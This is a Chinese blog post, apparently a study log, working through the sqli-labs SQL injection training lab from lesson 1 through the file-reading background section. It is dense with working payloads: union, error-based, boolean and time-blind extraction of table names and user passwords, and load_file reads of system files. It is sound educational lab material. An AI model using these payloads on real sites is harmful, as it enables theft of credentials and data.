@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>sqli-labs记录 | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="phpstudy 的版本会影响使用，使用默认的版本就行 php-5.4.45 + Apache 1~4 预备知识（基于错误的注入）几个常用函数 version()——MySQL 版本 user()——数据库用户名 database()——数据库名 @@datadir——数据库路径 @@version_compile_os——操作系统版本  系统表介绍SCHEMATA 表：提供了关于数据库的信息。T">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs记录">
+<meta property="og:url" content="https://yichen115.github.io/2020/02/07/wgbfv8/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="phpstudy 的版本会影响使用，使用默认的版本就行 php-5.4.45 + Apache 1~4 预备知识（基于错误的注入）几个常用函数 version()——MySQL 版本 user()——数据库用户名 database()——数据库名 @@datadir——数据库路径 @@version_compile_os——操作系统版本  系统表介绍SCHEMATA 表：提供了关于数据库的信息。T">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-02-07T11:57:07.000Z">
+<meta property="article:modified_time" content="2020-08-03T02:52:14.954Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">sqli-labs记录</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">sqli-labs记录</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-02-07T11:57:07.000Z" itemprop="datePublished" class="page-time">
+  2020-02-07
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#1-4-预备知识（基于错误的注入）"><span class="post-toc-number">1.</span> <span class="post-toc-text">1~4 预备知识（基于错误的注入）</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#几个常用函数"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">几个常用函数</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#系统表介绍"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">系统表介绍</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#字符连接函数"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">字符连接函数</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#测试语句"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">测试语句</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-1"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">less-1:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-2"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">less-2:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-3"><span class="post-toc-number">1.4.3.</span> <span class="post-toc-text">less-3:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-4"><span class="post-toc-number">1.4.4.</span> <span class="post-toc-text">less-4:</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#5-6-背景知识-2："><span class="post-toc-number">2.</span> <span class="post-toc-text">5~6 背景知识 2：</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基于布尔-SQL-盲注"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">基于布尔 SQL 盲注</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基于报错的-SQL-盲注"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">基于报错的 SQL 盲注</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-5-6"><span class="post-toc-number">2.2.1.</span> <span class="post-toc-text">less-5~6:</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#背景知识-3："><span class="post-toc-number">3.</span> <span class="post-toc-text">背景知识 3：</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-7"><span class="post-toc-number">3.0.1.</span> <span class="post-toc-text">less-7</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-8-10"><span class="post-toc-number">3.0.2.</span> <span class="post-toc-text">less-8~10</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-11-12："><span class="post-toc-number">3.0.3.</span> <span class="post-toc-text">less-11~12：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-13-14"><span class="post-toc-number">3.0.4.</span> <span class="post-toc-text">less-13~14:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-15-16"><span class="post-toc-number">3.0.5.</span> <span class="post-toc-text">less-15~16:</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#背景知识-4："><span class="post-toc-number">4.</span> <span class="post-toc-text">背景知识 4：</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#MySQL-数据库中的增删改查"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">MySQL 数据库中的增删改查</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-17"><span class="post-toc-number">4.1.1.</span> <span class="post-toc-text">less-17:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-18"><span class="post-toc-number">4.1.2.</span> <span class="post-toc-text">less-18:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-19："><span class="post-toc-number">4.1.3.</span> <span class="post-toc-text">less-19：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-20："><span class="post-toc-number">4.1.4.</span> <span class="post-toc-text">less-20：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-21："><span class="post-toc-number">4.1.5.</span> <span class="post-toc-text">less-21：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-22："><span class="post-toc-number">4.1.6.</span> <span class="post-toc-text">less-22：</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#HTTP-头部详解"><span class="post-toc-number">4.1.6.1.</span> <span class="post-toc-text">HTTP 头部详解</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-23"><span class="post-toc-number">4.1.7.</span> <span class="post-toc-text">less-23</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-24"><span class="post-toc-number">4.1.8.</span> <span class="post-toc-text">less-24</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-25"><span class="post-toc-number">4.1.9.</span> <span class="post-toc-text">less-25</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-25a"><span class="post-toc-number">4.1.10.</span> <span class="post-toc-text">less-25a</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-26"><span class="post-toc-number">4.1.11.</span> <span class="post-toc-text">less-26</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-26a"><span class="post-toc-number">4.1.12.</span> <span class="post-toc-text">less-26a</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-27"><span class="post-toc-number">4.1.13.</span> <span class="post-toc-text">less-27</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-27a"><span class="post-toc-number">4.1.14.</span> <span class="post-toc-text">less-27a</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-28"><span class="post-toc-number">4.1.15.</span> <span class="post-toc-text">less-28</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-28a"><span class="post-toc-number">4.1.16.</span> <span class="post-toc-text">less-28a</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-29-31"><span class="post-toc-number">4.1.17.</span> <span class="post-toc-text">less-29-31</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-32"><span class="post-toc-number">4.1.18.</span> <span class="post-toc-text">less-32</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-33"><span class="post-toc-number">4.1.19.</span> <span class="post-toc-text">less-33</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-34"><span class="post-toc-number">4.1.20.</span> <span class="post-toc-text">less-34</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-35"><span class="post-toc-number">4.1.21.</span> <span class="post-toc-text">less-35</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-36"><span class="post-toc-number">4.1.22.</span> <span class="post-toc-text">less-36</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-37"><span class="post-toc-number">4.1.23.</span> <span class="post-toc-text">less-37</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-38"><span class="post-toc-number">4.1.24.</span> <span class="post-toc-text">less-38</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#堆叠注入："><span class="post-toc-number">5.</span> <span class="post-toc-text">堆叠注入：</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-38-40："><span class="post-toc-number">5.0.1.</span> <span class="post-toc-text">less-38-40：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-41-45"><span class="post-toc-number">5.0.2.</span> <span class="post-toc-text">less-41-45</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ORDER-BY-注入"><span class="post-toc-number">6.</span> <span class="post-toc-text">ORDER BY  注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#order-by-报错注入"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">order by 报错注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#order-by-盲注"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">order by  盲注</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-46"><span class="post-toc-number">6.2.1.</span> <span class="post-toc-text">less-46</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-47"><span class="post-toc-number">6.2.2.</span> <span class="post-toc-text">less-47</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-48"><span class="post-toc-number">6.2.3.</span> <span class="post-toc-text">less-48</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-49"><span class="post-toc-number">6.2.4.</span> <span class="post-toc-text">less-49</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-50"><span class="post-toc-number">6.2.5.</span> <span class="post-toc-text">less-50</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-51"><span class="post-toc-number">6.2.6.</span> <span class="post-toc-text">less-51</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-52"><span class="post-toc-number">6.2.7.</span> <span class="post-toc-text">less-52</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-53"><span class="post-toc-number">6.2.8.</span> <span class="post-toc-text">less-53</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-54-57"><span class="post-toc-number">6.2.9.</span> <span class="post-toc-text">less-54-57</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less-58"><span class="post-toc-number">6.2.10.</span> <span class="post-toc-text">less-58</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-wgbfv8"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">sqli-labs记录</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-02-07 19:57:07" datetime="2020-02-07T11:57:07.000Z"  itemprop="datePublished">2020-02-07</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>phpstudy 的版本会影响使用，使用默认的版本就行 php-5.4.45 + Apache</p>
+<h1 id="1-4-预备知识（基于错误的注入）"><a href="#1-4-预备知识（基于错误的注入）" class="headerlink" title="1~4 预备知识（基于错误的注入）"></a>1~4 预备知识（基于错误的注入）</h1><h2 id="几个常用函数"><a href="#几个常用函数" class="headerlink" title="几个常用函数"></a>几个常用函数</h2><ol>
+<li>version()——MySQL 版本</li>
+<li>user()——数据库用户名</li>
+<li>database()——数据库名</li>
+<li>@@datadir——数据库路径</li>
+<li>@@version_compile_os——操作系统版本</li>
+</ol>
+<h2 id="系统表介绍"><a href="#系统表介绍" class="headerlink" title="系统表介绍"></a>系统表介绍</h2><p>SCHEMATA 表：提供了关于数据库的信息。<br>TABLES 表：给出了关于数据库中的表的信息。<br>COLUMNS 表：给出了表中的列信息。<br>STATISTICS 表：给出了关于表索引的信息。</p>
+<h2 id="字符连接函数"><a href="#字符连接函数" class="headerlink" title="字符连接函数"></a>字符连接函数</h2><ol>
+<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
+<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li>
+<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</li>
+</ol>
+<h2 id="测试语句"><a href="#测试语句" class="headerlink" title="测试语句"></a>测试语句</h2><p>or 1=1–+<br>‘ or 1=1–+<br>“ or 1=1–+<br>) or 1=1–+<br>‘) or 1=1–+<br>“) or 1=1–+<br>“)) or 1=1–+<br>一般情况代码为：<br>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br>加入测试语句后：’ or 1=1–+<br>$sql=”SELECT * FROM users WHERE id=’$id’ or 1=1–+’ LIMIT 0,1”;</p>
+<p>union 操作符：<br>用于合并两个或多个 select 语句<br>SELECT column_name(s) FROM table_name1<br>UNION<br>SELECT column_name(s) FROM table_name2<br>UNION 内部的 SELECT<br>语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的<br>列的顺序必须相同</p>
+<h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1:"></a>less-1:</h3><p>先添加单引号，报错，证明有 sql 漏洞<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1<br>说明查询语句是：<br>SELECT * FROM users WHERE id=’$id’ LIMIT 0,1<br><strong>‘</strong>‘1’’ LIMIT 0,1<strong>‘</strong></p>
+<p>尝试’ or 1=1–+<br>–+是为了把后面的注释掉<br>‘order by 4–+得到列数<br>-1’union select 1,2,3–+<br>显示出 2,3，说明这里可以回显<br>爆库：<br>union select 1,group_concat(schema_name),3 from information_schema.schemata–+<br>查询 schema_name（库名）并放到一个组里<br>从 information_schema.schemata（存放所有数据库名的表）里面<br>爆表：<br>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+<br>查询 table_name（表名）的信息放在一个组里<br>从 information_schema.tables（存放所有表名的地方）中 table_schema=’security’的地方<br>爆列：<br>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’–+<br>查询 column_name（列名）的信息，放在一个组里<br>从 information_schema.coulmns（存放所有列名的表）中 table_name=’users’的地方<br>爆数据：<br>union select 1,username,password from users where id=2–+<br>从 users 表中的 id=2 的地方查询 username 和 password 的内容</p>
+<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2:"></a>less-2:</h3><p>单引号报错<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1<br>说明查询语句是：<br>SELECT * FROM users WHERE id=$id LIMIT 0,1<br>‘’ LIMIT 0,1’<br>查询代码使用了整数<br>可以使用不加单引号的 or 1=1</p>
+<h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3:"></a>less-3:</h3><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1<br>说明查询语句是：<br>SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1<br>‘’1’’) LIMIT 0,1’<br>可以使用’)  或)  把前面闭合</p>
+<h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4:"></a>less-4:</h3><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at line 1<br>说明查询语句是：<br>SELECT * FROM users WHERE id=(“$id”) LIMIT 0,1<br>‘“1””) LIMIT 0,1’<br>可以使用：”)闭合就行了</p>
+<h1 id="5-6-背景知识-2："><a href="#5-6-背景知识-2：" class="headerlink" title="5~6 背景知识 2："></a>5~6 背景知识 2：</h1><p>盲注：数据不能回显到前端页面，我们需要利用一些方法进行判断或者尝试</p>
+<h2 id="基于布尔-SQL-盲注"><a href="#基于布尔-SQL-盲注" class="headerlink" title="基于布尔 SQL 盲注"></a>基于布尔 SQL 盲注</h2><p>———-构造逻辑判断</p>
+<p>（知识）SQL 注入截取字符串常用函数：<br><a href="http://www.cnblogs.com/lcamry/p/5504374.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5504374.html</a><br>1.mid(column_name,start[,length])<br>column_name——要提取的字段<br>start——规定开始位置<br>length——要返回的字符数， 如果省略，则 mid()  函数返回剩余文本</p>
+<p>例如 str=”123456”<br>mid(str,2,1)  —–&gt;结果为 2</p>
+<p>mid(database(),1,1)&gt;’a’，查看数据库的第一位，<br>mid(database(),2,1)&gt;’a’，产看数据库的第二位，</p>
+<p>MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处 column_name 参数可以为 sql 语句，可自行构造 sql 语句进行注入</p>
+<p>2.substr(string,start,length)</p>
+<p>substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，<br>substr(DATABASE(),2,1)&gt;’a’,查看数据库名第二位，<br>substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处 string 参数可以为 sql 语句，可自行构造 sql 语句进行注入。</p>
+<p>3.left(string,n)</p>
+<p>left(database(),1)&gt;’a’,查看数据库名的第一位<br>left(database(),2)&gt;’a’,查看数据库名的第二位</p>
+<p>再用 ord(上面的函数)&gt;数字（ASCII 码值）<br>ord(mid(database(),1,1))&gt;144</p>
+<p>检查 database()的第一位 ASCⅡ 码是否大于 144</p>
+<p>regexp 正则注入：<br><a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5717442.html</a><br>用法：select user() regexp ‘^r’;<br>检验是否存在 r 中，在 MySQL 中会显示 1<br>但是在网页上可以用<br>select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1);</p>
+<p>limit 只是作用于前面的 security 的，想测试别的表名只是改一下表名就行</p>
+<p>like 匹配注入<br>select user() like ‘ro%’<br>beecheck()重复执行</p>
+<p>笛卡尔积：<br>如果 user 表中有 4 条数据<br>select count(*) from user A, user B<br>得：16</p>
+<h2 id="基于报错的-SQL-盲注"><a href="#基于报错的-SQL-盲注" class="headerlink" title="基于报错的 SQL 盲注"></a>基于报错的 SQL 盲注</h2><p>——构造 payload 让信息通过错误提示回显出来</p>
+<p>MySQL 的一个漏洞可以让信息显示出来</p>
+<p>Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;<br>简化为<br>select count(</em>) from information_schema.tables group by concat(version(), floor(rand(0)*2))</p>
+<p>如果关键的表被禁用了，可以用：<br>select count(<em>) from (select 1 union select null union<br>select !1) group by concat(version(),floor(rand(0)</em>2))</p>
+<p>如果 rand 被禁用了，可以用：<br>select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</p>
+<p>select exp(~(select * from(select user())a))  //double 数值类型超出范围<br>参考文章：<a href="http://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p>
+<p>select !(select * from (select user())x)   //bigint 超出范围<br>参考文章<br><a href="http://www.cnblogs.com/lcamry/articles/5509112.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p>
+<p>extractvalue(1,concat(0x7e,(select @@version),0x7e))<br>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
+<p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)<br>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
+<p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;<br>mysql 重复特性，此处重复了 version，所以报错</p>
+<p>•基于时间的 SQL 盲注——延时注入</p>
+<p>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句，条件为假，执行 sleep</p>
+<p>select sleep (find_in_set(mid(@@version,1,1),’0,1,2,3,4,5,6,7,8,9,.’));<br>在 0-9 之间寻找版本号的第一位</p>
+<h3 id="less-5-6"><a href="#less-5-6" class="headerlink" title="less-5~6:"></a>less-5~6:</h3><p>less-5<br>布尔盲注：<br>构造?id=1  发现返回 you are in….不会返回信息了，说明是盲注</p>
+<p>‘and left (version(),1)=5%23（测试数据库版本第一位是不是 5）<br>返回正常,前面那个单引号是为了闭合变量 id</p>
+<p>‘and length(database())=8%23<br>测试数据库长度</p>
+<p>‘and left(database(),1)&gt;’a’–+<br>测试数据库第一位是否大于 a</p>
+<p>‘and left(database(),2)&gt;’sa’–+<br>测试数据库前两位是否大于 sa</p>
+<p>‘and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80–+</p>
+<p>检测数据表的第一个字符是否大于 ascii 80</p>
+<p>‘and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;80–+<br>检测数据表的第二个字符是否大于 ascii80<br>此处 limit 限制的仍然是表的第几个，所以希望查看别的表的时候可以更改 limit,即，第二个表测试的时候可改为 limit 1,1</p>
+<p>‘ and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^us[a-z]’ limit 0,1)–+<br>检测 users 表中是否含有带有 us 的列名</p>
+<p>这里 select 1 from…..表里如果有记录，就显示 1<br>简单理解就是不查询具体列，只要有值就显示 1</p>
+<p>‘ and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+<br>检测表 users 中是否含有 username 的列名</p>
+<p>利用 ord()和 mid()获取 users 表内容<br>‘ and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM security.users ORDER BY id LIMIT 0,1),1,1))=68–+<br>获取表中 username 第一行第一个字段值 ascii 与 68 比较</p>
+<p>基于错误的盲注<br>固定格式                                                       想要查询的内容<br>‘ union Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)</em>2))a from information_schema.columns group by a–+<br>当在一个聚合函数如 count()函数后面，如果使用分组语句如 group by 就会把查询的一部分以错误的形式显示出来</p>
+<p>基于时间的盲注</p>
+<p>‘and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p>
+<p>当条件不成立，即错误时会有 5 秒钟的延时<br>关于 if 语句： if(condition,ture,false)  若条件正确，执行 ture,不正确执行 false<br>‘and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80,1,sleep(5))–+</p>
+<p>‘and if(ascii(substr((select column_name from information_schema.columns where table_name=’users’),1,1))&gt;80,1,sleep(5))–+<br>显示子查询由多行，还是不要用延时注入了，用正则表达式吧<br>‘ and 1=(select 1 from information_schema.columns where table_name=’users’ and table_name regexp ‘^us[a-z]’ limit 0,1)–+<br>‘ and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+</p>
+<p>less-6<br>$id = ‘“‘.$id.’”‘;<br>$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br>对传参进行了设置，闭合语句换了，把第五关的单引号换成双引号</p>
+<h1 id="背景知识-3："><a href="#背景知识-3：" class="headerlink" title="背景知识 3："></a>背景知识 3：</h1><p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串<br>使用条件： 1.使用 and (selectcountfrom mysql.user)&gt;0/*若返回正常，则说明有权限 2.读取的文件必须在服务器上 3.必须提供完整路径 4.文件必须小于 max_allowed_packet</p>
+<p>Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))<br>利用 hex()将文件内容导出来，尤其是 smb 文件时可以使用。</p>
+<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))<br>Explain：”char(99,58,47,98,111,111,116,46,105,110,105)” 就是”c:/boot.ini”的 ASCII 代码</p>
+<p>-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)<br>Explain：”c:/boot.ini”的 16 进制是”0x633a2f626f6f742e696e69”</p>
+<p>-1 union select 1,1,1,load_file(c:\boot.ini)<br>Explain:路径里的/用 \代替</p>
+<p>文件导入到数据库<br>当你具有数据库的权限时，可以将系统文件利用 load data infile 导入到数据库中<br>实例：<br>load data infile ‘/tmp/t0.txt’ ignore into table t0 character set gbk fields terminated by ‘\t’ lines terminated by ‘\n’</p>
